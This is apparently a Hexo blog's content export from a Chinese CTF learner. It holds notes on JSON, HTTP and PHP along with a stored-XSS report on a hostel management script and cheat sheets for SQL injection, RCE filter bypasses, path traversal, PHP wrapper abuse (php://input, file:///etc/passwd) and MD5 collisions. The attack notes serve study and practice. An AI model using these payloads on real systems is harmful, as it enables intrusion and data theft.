{"meta":{"title":"Yunlin's Blog","subtitle":"","description":"分享技术知识，探讨编程问题，一起成长。","author":"John Doe","url":"http://asd1238525.github.io","root":"/"},"pages":[{"title":"contributors","date":"2024-12-01T16:42:43.000Z","updated":"2024-12-01T16:42:44.000Z","comments":true,"path":"contributors/index.html","permalink":"http://asd1238525.github.io/contributors/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2009-04-22T19:24:48.000Z","updated":"2024-12-01T16:16:32.000Z","comments":true,"path":"categories/index.html","permalink":"http://asd1238525.github.io/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2024-12-01T16:39:22.000Z","updated":"2024-12-01T16:39:24.000Z","comments":true,"path":"archives/index.html","permalink":"http://asd1238525.github.io/archives/index.html","excerpt":"","text":""},{"title":"","date":"2009-04-22T19:24:48.000Z","updated":"2024-12-01T16:15:54.000Z","comments":true,"path":"about/index.html","permalink":"http://asd1238525.github.io/about/index.html","excerpt":"","text":"下面写关于自己的内容"},{"title":"examples","date":"2024-12-01T16:39:02.000Z","updated":"2024-12-01T16:39:04.000Z","comments":true,"path":"examples/index.html","permalink":"http://asd1238525.github.io/examples/index.html","excerpt":"","text":""},{"title":"faqs","date":"2024-12-01T16:38:47.000Z","updated":"2024-12-01T16:38:50.000Z","comments":true,"path":"faqs/index.html","permalink":"http://asd1238525.github.io/faqs/index.html","excerpt":"","text":""},{"title":"getting-started","date":"2024-12-01T16:44:21.000Z","updated":"2024-12-01T16:44:22.000Z","comments":true,"path":"getting-started/index.html","permalink":"http://asd1238525.github.io/getting-started/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2009-04-22T19:24:48.000Z","updated":"2024-12-01T16:16:46.000Z","comments":true,"path":"tags/index.html","permalink":"http://asd1238525.github.io/tags/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2009-04-22T19:24:48.000Z","updated":"2024-12-02T14:28:54.000Z","comments":true,"path":"friends/index.html","permalink":"http://asd1238525.github.io/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"}],"posts":[{"title":"xss","slug":"xss","date":"2024-12-17T11:53:05.000Z","updated":"2024-12-17T11:53:46.000Z","comments":true,"path":"2024/12/17/xss/","permalink":"http://asd1238525.github.io/2024/12/17/xss/","excerpt":"","text":"Hostel Management Systemsupplierhttps://code-projects.org/hostel-management-site-using-php-source-code/ Vulnerability filebook-hostel.php room-details.php describeThe book-hostel.php file contains an unrestricted cross-site scripting (XSS) vulnerability, where all parameters can be passed into the room-details.php database, leading to a stored XSS attack. Malicious attackers can exploit this vulnerability to obtain sensitive information from the client side. Code analysisLine 7-40 in book-hostel.php 12345678910111213141516171819202122232425262728293031323334if(isset($_POST[&#x27;submit&#x27;]))&#123;$roomno=$_POST[&#x27;room&#x27;];$seater=$_POST[&#x27;seater&#x27;];$feespm=$_POST[&#x27;fpm&#x27;];$foodstatus=$_POST[&#x27;foodstatus&#x27;];$stayfrom=$_POST[&#x27;stayf&#x27;];$duration=$_POST[&#x27;duration&#x27;];$course=$_POST[&#x27;course&#x27;];$regno=$_POST[&#x27;regno&#x27;];$fname=$_POST[&#x27;fname&#x27;];$mname=$_POST[&#x27;mname&#x27;];$lname=$_POST[&#x27;lname&#x27;];$gender=$_POST[&#x27;gender&#x27;];$contactno=$_POST[&#x27;contact&#x27;];$emailid=$_POST[&#x27;email&#x27;];$emcntno=$_POST[&#x27;econtact&#x27;];$gurname=$_POST[&#x27;gname&#x27;];$gurrelation=$_POST[&#x27;grelation&#x27;];$gurcntno=$_POST[&#x27;gcontact&#x27;];$caddress=$_POST[&#x27;address&#x27;];$ccity=$_POST[&#x27;city&#x27;];$cstate=$_POST[&#x27;state&#x27;];$cpincode=$_POST[&#x27;pincode&#x27;];$paddress=$_POST[&#x27;paddress&#x27;];$pcity=$_POST[&#x27;pcity&#x27;];$pstate=$_POST[&#x27;pstate&#x27;];$ppincode=$_POST[&#x27;ppincode&#x27;];$query=&quot;insert into registration(roomno,seater,feespm,foodstatus,stayfrom,duration,course,regno,firstName,middleName,lastName,gender,contactno,emailid,egycontactno,guardianName,guardianRelation,guardianContactno,corresAddress,corresCIty,corresState,corresPincode,pmntAddress,pmntCity,pmnatetState,pmntPincode) values(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)&quot;;$stmt = $mysqli-&gt;prepare($query);$rc=$stmt-&gt;bind_param(&#x27;iiiisisissssisississsisssi&#x27;,$roomno,$seater,$feespm,$foodstatus,$stayfrom,$duration,$course,$regno,$fname,$mname,$lname,$gender,$contactno,$emailid,$emcntno,$gurname,$gurrelation,$gurcntno,$caddress,$ccity,$cstate,$cpincode,$paddress,$pcity,$pstate,$ppincode);$stmt-&gt;execute();echo&quot;&lt;script&gt;alert(&#x27;Student Succssfully register&#x27;);&lt;/script&gt;&quot;;&#125; POCFor pcity parameter, the test payload is alert(1)For paddress parameter, the test payload is alert(document.cookie)Visit this URL to trigger the cross-site scripting vulnerability. 1http://localhost:8083/hostel/hostel/room-details.php RusultFor parameter “pcity”:For parameter “paddress”:","categories":[],"tags":[]},{"title":"路径穿越","slug":"路径穿越","date":"2024-12-15T14:45:15.000Z","updated":"2024-12-17T03:58:54.000Z","comments":true,"path":"2024/12/15/路径穿越/","permalink":"http://asd1238525.github.io/2024/12/15/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/","excerpt":"","text":"基本判断 有足够权限 存在send_file等能下载文件的函数 下载文件可控 flag路径获取 查看题目的dockerfile看文件路径 爆破或者其他路径获得 WAF绕过 ..&#x2F;替换为空通过双写绕过即….&#x2F;&#x2F;….&#x2F;&#x2F;注意:要代码审计有的题目会有for循环,要注意循环次数确定复写次数 &#x2F;..禁用通过&#x2F;5%C.. 这种只在python中有效的绕过方式 ..&#x2F;禁用同上用..%5C&#x2F; ..&#x2F;..&#x2F;和通过..&#x2F;.&#x2F;..&#x2F;.&#x2F;","categories":[],"tags":[]},{"title":"","slug":"ssti模板注入","date":"2024-12-15T10:27:54.430Z","updated":"2024-12-17T12:07:52.000Z","comments":true,"path":"2024/12/15/ssti模板注入/","permalink":"http://asd1238525.github.io/2024/12/15/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"JSON学习","slug":"JSON学习","date":"2024-12-09T13:43:49.000Z","updated":"2024-12-10T14:50:18.000Z","comments":true,"path":"2024/12/09/JSON学习/","permalink":"http://asd1238525.github.io/2024/12/09/JSON%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"JSON简单来说就是一种语言格式,语法是js的子集 JSON 名称&#x2F;值对JSON 数据的书写格式是： 1key:value 其中，key 是字符串，value 可以是字符串、数值、布尔值、数组、对象等。“name” : “菜鸟教程” 等价于这条 JavaScript name &#x3D; “菜鸟教程” JSON的值 数字(integer&#x2F;float) 字符串(在双引号中) 逻辑值(true&#x2F;false) 数组(在中括号中) 对象(在大括号中) null 访问对象值访问对象值可以使用点号(.)或者中括号([])，如下所示： 1234567var myObj, x;myObj = &#123; &quot;name&quot;:&quot;runoob&quot;, &quot;alexa&quot;:10000, &quot;site&quot;:null &#125;;x = myObj.name;var myObj, x;myObj = &#123; &quot;name&quot;:&quot;runoob&quot;, &quot;alexa&quot;:10000, &quot;site&quot;:null &#125;;x = myObj[&quot;name&quot;]; 嵌套 JSON 对象123456789myObj = &#123; &quot;name&quot;:&quot;runoob&quot;, &quot;alexa&quot;:10000, &quot;sites&quot;: &#123; &quot;site1&quot;:&quot;www.runoob.com&quot;, &quot;site2&quot;:&quot;m.runoob.com&quot;, &quot;site3&quot;:&quot;c.runoob.com&quot; &#125;&#125; 数组和对象差不多,不赘述。 JSON.parse()将数据转换为 JavaScript 对象。语法: 1JSON.parse(text[, reviver]) text: 要解析的 JSON 字符串。 reviver: 一个可选的转换函数，在转换过程中用于修改值。 JSON.stringify()将 JavaScript 对象转换为字符串。语法: 1JSON.stringify(value[, replacer[, space]]) value: 要转换为 JSON 字符串的值。 replacer: 一个可选的函数或数组，用于转换值。 space: 一个可选的数字或字符串，用于增加美观度。","categories":[],"tags":[]},{"title":"RCE绕过","slug":"RCE绕过","date":"2024-12-07T15:57:53.000Z","updated":"2024-12-11T15:54:32.000Z","comments":true,"path":"2024/12/07/RCE绕过/","permalink":"http://asd1238525.github.io/2024/12/07/RCE%E7%BB%95%E8%BF%87/","excerpt":"","text":"管道符 ; A;B 无论真假，A与B都执行 &amp; A&amp;B 无论真假，A与B都执行 &amp;&amp; A&amp;&amp;B A为真时才执行B，否则只执行A | A|B 只显示B的结果 || A||B A为假时才执行B，否则只执行A 空格过滤这些都可以代替空格:&lt; &lt;&gt; %20(即space) %09(即tab) $IFS$9 ${IFS} $IFS {cat,&#x2F;flag} 反斜杠绕过cat和ls被过滤,可以用c&#x2F;at和l&#x2F;s代替 异或绕过字符串phpinfo异或结果为”0302181”^”@[@[_^^” base64和hex绕过与上差不多 正则匹配绕过例如flag被过滤 cat &#x2F;f* cat &#x2F;f[a-z]{3} 引号过滤 ca””t &#x2F;flag l’s’ &#x2F;flag cat指令替换 tac 与cat相反,按行倒序输出 more 按页输出 less 与more相似,但可以向上翻页 od 以二进制方式输出文件内容,od -A d -c &#x2F;flag转人可读字符 xxd 以二进制方式输出文件内容有可读字符显示 file -f 报错文件内容 回溯绕过php正则的回溯次数大于1000000次时返回False 12$a = &#x27;hello world&#x27;+&#x27;h&#x27;*1000000preg_match(&quot;/hello.*world/is&quot;,$a) == False 自增绕过 原理:只要拿到一个变量的值为a,就可以通过自增获得a-z的字符,而数组的第一个字母是A第四个字母是a,等于可以获得所有字母 1234567$_=[];$_=@&quot;$_&quot;;//$_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S 无回显可以用sleep()函数判断 无字母RCElinux中使用$’xxx’（xxx为字符的八进制）的形式可以执行任意代码 执行ls:$’\\154\\163’注意:八进制的执行方法不能执行带有参数的linux命令，如cat &#x2F;flag(&#x2F;flag为参数)或ls -la(-la为参数)重定向符可以代替空格 执行cat &#x2F;flag:$’\\143\\141\\164’&lt;$’\\57\\146\\154\\141\\147’ 无参RCE特征: 123if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123; eval($_GET[&#x27;star&#x27;]);&#125; 正则表达式 [^\\W]+((?R)?) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;,无参数rce就是不使用参数，而只使用一个个函数最终达到目的。 scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换） localeconv() ：返回包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大） current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西 getcwd() :取得当前工作目录 chdir() :改变当前工作目录 eval()、assert()：命令执行 hightlight_file()、show_source()、readfile()：读取文件内容 end() ： 将内部指针指向数组中的最后一个元素，并输出 next() ：将内部指针指向数组中的下一个元素，并输出 prev() ：将内部指针指向数组中的上一个元素，并输出 reset() ： 将内部指针指向数组中的第一个元素，并输出 each() ： 返回当前元素的键名和键值，并将内部指针向前移动 查看当前目录下的文件: 1?参数=var_dump(scandir(current(localeconv()))); ?exp&#x3D;highligth_file(next(array_reverse(scandir(current(localeconv())))));","categories":[],"tags":[]},{"title":"md5绕过","slug":"md5绕过","date":"2024-12-07T14:01:55.000Z","updated":"2024-12-11T14:03:42.000Z","comments":true,"path":"2024/12/07/md5绕过/","permalink":"http://asd1238525.github.io/2024/12/07/md5%E7%BB%95%E8%BF%87/","excerpt":"","text":"1.弱相等 直接数组绕过 常规0e绕过 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等2.强类型比较1if((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) payload如下：12a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 收录一些MD5值相等的字符串 123456$Param1=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;;$Param2=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;;$data1=&quot;\\xd1\\x31\\xdd\\x02\\xc5\\xe6\\xee\\xc4\\x69\\x3d\\x9a\\x06\\x98\\xaf\\xf9\\x5c\\x2f\\xca\\xb5\\x07\\x12\\x46\\x7e\\xab\\x40\\x04\\x58\\x3e\\xb8\\xfb\\x7f\\x89\\x55\\xad\\x34\\x06\\x09\\xf4\\xb3\\x02\\x83\\xe4\\x88\\x83\\x25\\xf1\\x41\\x5a\\x08\\x51\\x25\\xe8\\xf7\\xcd\\xc9\\x9f\\xd9\\x1d\\xbd\\x72\\x80\\x37\\x3c\\x5b\\xd8\\x82\\x3e\\x31\\x56\\x34\\x8f\\x5b\\xae\\x6d\\xac\\xd4\\x36\\xc9\\x19\\xc6\\xdd\\x53\\xe2\\x34\\x87\\xda\\x03\\xfd\\x02\\x39\\x63\\x06\\xd2\\x48\\xcd\\xa0\\xe9\\x9f\\x33\\x42\\x0f\\x57\\x7e\\xe8\\xce\\x54\\xb6\\x70\\x80\\x28\\x0d\\x1e\\xc6\\x98\\x21\\xbc\\xb6\\xa8\\x83\\x93\\x96\\xf9\\x65\\xab\\x6f\\xf7\\x2a\\x70&quot;;$data2=&quot;\\xd1\\x31\\xdd\\x02\\xc5\\xe6\\xee\\xc4\\x69\\x3d\\x9a\\x06\\x98\\xaf\\xf9\\x5c\\x2f\\xca\\xb5\\x87\\x12\\x46\\x7e\\xab\\x40\\x04\\x58\\x3e\\xb8\\xfb\\x7f\\x89\\x55\\xad\\x34\\x06\\x09\\xf4\\xb3\\x02\\x83\\xe4\\x88\\x83\\x25\\x71\\x41\\x5a\\x08\\x51\\x25\\xe8\\xf7\\xcd\\xc9\\x9f\\xd9\\x1d\\xbd\\xf2\\x80\\x37\\x3c\\x5b\\xd8\\x82\\x3e\\x31\\x56\\x34\\x8f\\x5b\\xae\\x6d\\xac\\xd4\\x36\\xc9\\x19\\xc6\\xdd\\x53\\xe2\\xb4\\x87\\xda\\x03\\xfd\\x02\\x39\\x63\\x06\\xd2\\x48\\xcd\\xa0\\xe9\\x9f\\x33\\x42\\x0f\\x57\\x7e\\xe8\\xce\\x54\\xb6\\x70\\x80\\xa8\\x0d\\x1e\\xc6\\x98\\x21\\xbc\\xb6\\xa8\\x83\\x93\\x96\\xf9\\x65\\x2b\\x6f\\xf7\\x2a\\x70&quot;; 4.$a&#x3D;&#x3D;md5($a)0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等 这里引用了这篇文章总结加深印象","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/tags/CTF/"}]},{"title":"零碎知识","slug":"零碎知识","date":"2024-12-06T11:00:43.000Z","updated":"2024-12-13T12:29:28.000Z","comments":true,"path":"2024/12/06/零碎知识/","permalink":"http://asd1238525.github.io/2024/12/06/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/","excerpt":"","text":"正则表达式中的 &#x2F;e 修正符 &#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 $$(&lt;$&lt;)这行命令会尝试把 Flag 作为文件名进行文件读取，但是由于没有该文件所以会报错，而错误内容中存在 Flag。 preg_replace(pattern, replacement, subject) &#x2F;(.*)&#x2F;e 匹配任意字符（包括换行符）一次或多次，并捕获到一个数组中。 &#x2F;：正则表达式的开始和结束定界符。 (.)：这是一个捕获组，里面的 . 表示匹配零个或多个任意字符（. 表示可以匹配任何单个字符，* 表示零个或多个）。 &#x2F;e 修饰符表示替换字符串应该作为 PHP 代码来执行。这是一个已弃用且潜在危险的特性，因为它允许通过替换字符串执行代码。 Error::getMessage例XYCTF的ezclass 123456789&lt;?phphighlight_file(__FILE__); $a=$_GET[&#x27;a&#x27;]; $aa=$_GET[&#x27;aa&#x27;]; $b=$_GET[&#x27;b&#x27;]; $bb=$_GET[&#x27;bb&#x27;]; $c=$_GET[&#x27;c&#x27;]; ((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c()); ?&gt; 基本思路就是创建两个error类分别给system和cat &#x2F;flag两个参数，再用getMessage方法把输进去的参数当作字符串返回6. curl 命令.域名 直接访问域名，可以看到命令的执行结果。7. call_user_func()(call_user_func)(system,whoami,’’)即可执行whoami的命令8. file_put_contents()伪协议读取文件内容9. flag一般在目录文件里,env环境变量,或者在内存中10. %00private属性11. &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 日志文件","categories":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/tags/CTF/"}]},{"title":"PHP伪协议","slug":"PHP伪协议","date":"2024-12-06T05:25:25.000Z","updated":"2024-12-06T06:11:52.000Z","comments":true,"path":"2024/12/06/PHP伪协议/","permalink":"http://asd1238525.github.io/2024/12/06/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"1.php:&#x2F;&#x2F;filter语法格式: php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;要编码的文件路径过滤器:read&#x3D;string.toupper PHP5.0.0及以后版本，将数据流转换成「大写」，类似于 strupper() 函数read&#x3D;string.tolower PHP5.0.0及以后版本，将数据流转换成「小写」，类似 strtolower()函数。read&#x3D;string.rot13 PHP4.3.0及以后版本，对数据流的内容进行「rot13编码」，等于用str_rot13() 函数编码。ROT13会把每一个字母替换成13位之后的字母，也就是把a换成n，b换成o，以此类推；如果超过了26个字母的范围，就会从开头重新开始。read&#x3D;convert.base64-encode 对数据流的内容进行「base64编码」，相当于 base64_encode()函数read&#x3D;convert.iconv.utf-8*.utf-16* 意思就是把文件的字符编码从 utf-8* 转换为 utf-16*支持的字符编码有：UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*EUC-JP*SJIS*eucJP-win*SJIS-win*ISO-2022-JPISO-2022-JP-MSCP932CP51932SJIS-mac (alias: MacJapanese)SJIS-Mobile#DOCOMO (alias: SJIS-DOCOMO)SJIS-Mobile#KDDI (alias: SJIS-KDDI)SJIS-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)UTF-8-Mobile#DOCOMO (alias: UTF-8-DOCOMO)UTF-8-Mobile#KDDI-AUTF-8-Mobile#KDDI-B (alias: UTF-8-KDDI)UTF-8-Mobile#SOFTBANK (alias: UTF-8-SOFTBANK)ISO-2022-JP-MOBILE#KDDI (alias: ISO-2022-JP-KDDI)JISJIS-msCP50220CP50220rawCP50221CP50222ISO-8859-1*ISO-8859-2*ISO-8859-3*ISO-8859-4*ISO-8859-5*ISO-8859-6*ISO-8859-7*ISO-8859-8*ISO-8859-9*ISO-8859-10*ISO-8859-13*ISO-8859-14*ISO-8859-15*ISO-8859-16*byte2bebyte2lebyte4bebyte4leBASE64HTML-ENTITIES (alias: HTML)7bit8bitEUC-CN*CP936GB18030HZEUC-TW*CP950BIG-5*EUC-KR*UHC (alias: CP949)ISO-2022-KRWindows-1251 (alias: CP1251)Windows-1252 (alias: CP1252)CP866 (alias: IBM866)KOI8-R*KOI8-U*ArmSCII-8 (alias: ArmSCII8)2.php:&#x2F;&#x2F;input访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行,遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。3.data:&#x2F;&#x2F;示例用法：data:&#x2F;&#x2F;text&#x2F;plain,http://127.0.0.1/include.php?file=data://text/plain,data:&#x2F;&#x2F;text&#x2F;plain;base64,http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b4.file:&#x2F;&#x2F;用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径)比如：http://www.xx.com?file=file:///etc/passsword5.zip:&#x2F;&#x2F;zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。zip:&#x2F;&#x2F;中只能传入绝对路径。","categories":[{"name":"PHP","slug":"PHP","permalink":"http://asd1238525.github.io/categories/PHP/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/tags/CTF/"}]},{"title":"SQL","slug":"SQL","date":"2024-12-03T14:18:31.000Z","updated":"2024-12-12T16:34:10.000Z","comments":true,"path":"2024/12/03/SQL/","permalink":"http://asd1238525.github.io/2024/12/03/SQL/","excerpt":"","text":"1.函数length():计算字符串的长度substr(string, start, length):截取字符串ASCII():返回字符串最左边字符的数值,若为空字符串则返回0,若为null则返回null,与substr可以配合使用sleep():暂停指定的时间rename:例将word表名改为word1,则rename tables word to word1; (字符串为表名操作时要加反引号)concat(string1, string2, string3…):连接多个字符串2.基本做题流程首先判断闭合点有’,”,),’),”)等等,再通过xxx order by 3 –+(注意有时候用#) 假设有三个注入点,当输入4时就会报错,接下来就可以通过堆叠注入,联合注入,二次注入等等方法进行攻击,最后通过报错信息分析注入点,进行绕过3.联合注入xxx union select 1,2,3 –+xxx union select 1,2,database() –+ 爆库,假设database()&#x3D;sqlixxx union select 1,2,(group_concat(table_name) from information_schema.tables where table_schema&#x3D;’sqli’)–+ 爆表,假设两个表名,user,asdfxxx union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’user’)–+ 爆列,假设user表有两个列名,id,passwordxxx union select 1,group_concat(id),group_concat(password) from sqli.user –+ 爆数据4.堆叠注入sql语句以;结尾,堆叠注入原理就是通过结束符同时执行多条sql语句(前提存在sql漏洞,;没有被过滤,只有当调用数据库函数支持执行多条sql语句时才能够使用)xxx;show databases;–+ 爆数据库xxx;show tables;–+ 爆表xxx;show columns from user;–+ 爆列xxx;select * from user;–+ 爆数据5.万能密码【数值型万能账号】1 or 1&#x3D;1 # 万能密码,会直接登录成功,但不具有任何权限,适用于弱口令爆破【单引号字符型万能密码】1’ or 1&#x3D;1 #【双引号字符型万能密码】1” or 1&#x3D;1 #admin’ or 1&#x3D;1#6.报错注入 爆库:1’ and updatexml(1,concat(0x7e,database(),0x7e),1)# 爆表:1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) # 爆字段:1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’dvwa’ and table_name&#x3D;’users’),0x7e),1) # 爆数据库内容:1’ and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #7.handler handler 表名 open; handler 表名 read first; handler 表名 close;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/tags/CTF/"}]},{"title":"Misc编码总结","slug":"Misc编码总结","date":"2024-12-03T13:49:08.000Z","updated":"2024-12-06T05:27:46.000Z","comments":true,"path":"2024/12/03/Misc编码总结/","permalink":"http://asd1238525.github.io/2024/12/03/Misc%E7%BC%96%E7%A0%81%E6%80%BB%E7%BB%93/","excerpt":"","text":"1.编码一般以&#x3D;&#x2F;&#x3D;&#x3D;结尾的一般是base64编码,如果是以&#x3D;开头的可以尝试将其反转再解码2.解码结果若是像flag{xxx}这样的格式,大概率是凯撒加密3.工具可以使用随波逐流,Cyberchef,在线解密网站等……………………..","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/tags/CTF/"}]},{"title":"HTTP","slug":"HTTP","date":"2024-12-03T13:35:11.000Z","updated":"2024-12-06T14:50:06.000Z","comments":true,"path":"2024/12/03/HTTP/","permalink":"http://asd1238525.github.io/2024/12/03/HTTP/","excerpt":"","text":"1.请求方式GET：请求指定的页面信息，并返回实体内容,直接在url中发送。POST：向指定资源提交数据进行处理请求，如提交表单或者上传文件。2.服务端与客户端客户端：浏览器、手机App、爬虫、模拟工具等服务端：Web服务器、应用程序服务器、数据库服务器等3.请求头Host: 告知服务器请求的主机名和端口号User-Agent: 告知服务器客户端的类型、操作系统及版本、浏览器及版本等信息Accepet: 告知服务器客户端可接受的内容类型Content-Type: 告知服务器请求的数据类型及编码格式Referer: 告知服务器当前请求的来源地址Cookie: 告知服务器客户端的状态信息4.响应头Status: 响应状态码Content-Type: 响应数据的类型及编码格式Content-Length: 响应数据的长度Date: 响应时间Server: 服务器的类型及版本Set-Cookie: 向浏览器发送Cookie,随后浏览器返还给服务器5.HTTP和HTTPS两种本质是一样的,但http是明文传输,https是加密传输。6.常见url编码%20:表示空格%00:表示空字符%25:表示%%0a:表示换行符%3d:表示&#x3D;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/tags/CTF/"}]},{"title":"PHP速成","slug":"PHP速成","date":"2024-12-02T10:22:11.000Z","updated":"2024-12-07T15:29:08.000Z","comments":true,"path":"2024/12/02/PHP速成/","permalink":"http://asd1238525.github.io/2024/12/02/PHP%E9%80%9F%E6%88%90/","excerpt":"","text":"编程语言大多数都有共通的基础语法，比如变量、数据类型、运算符、控制结构等。而PHP也不例外，下面就让我们一起快速了解PHP的基础语法。 变量$变量名 &#x3D; 值;变量名可以是字母、数字、下划线组成，但不能以数字开头。属于动态类型，可以赋不同类型的值。 数据类型PHP有以下几种数据类型： 整型：int 浮点型：float、double 字符串型：string 布尔型：boolean 数组型：array 运算符 算术运算符：+、-、*、&#x2F;、% 赋值运算符：&#x3D;、+&#x3D;、-&#x3D;、*&#x3D;、&#x2F;&#x3D;、%&#x3D; 比较运算符：&#x3D;&#x3D;、!&#x3D;、&gt;、&lt;、&gt;&#x3D;、&lt;&#x3D; 逻辑运算符：&amp;&amp;、||、! 位运算符：&amp;、|、^、~、&lt;&lt;、&gt;&gt; 控制结构 if语句：if(条件){执行的代码} if…else语句：if(条件){执行的代码}else{执行的代码} if…elseif…else语句：if(条件1){执行的代码1}elseif(条件2){执行的代码2}else{执行的代码3} switch语句：switch(表达式){case 值1:执行的代码1;break;case 值2:执行的代码2;break;default:执行的代码3;} for语句：for(初始化;条件;递增){执行的代码} while语句：while(条件){执行的代码} do…while语句：do{执行的代码}while(条件); foreach语句：foreach(数组 as 变量){执行的代码} 例: foreach($arr as $value){echo $value;} break语句：用于跳出循环 continue语句：用于跳过当前循环，直接进入下一次循环5.类与对象 类：class 类名{属性和方法} 对象：$对象名 &#x3D; new 类名();(要接收类的属性,要先创建对象,然后用-&gt;来访问属性。例: $obj-&gt;属性名) 属性:大概意思是一只猫的颜色、大小、品种等。还分为公有属性,私有属性,和受保护属性。例如：$router &#x3D; new Router();$router-&gt;new(‘GET’, ‘&#x2F;‘, ‘TimeController@index’); 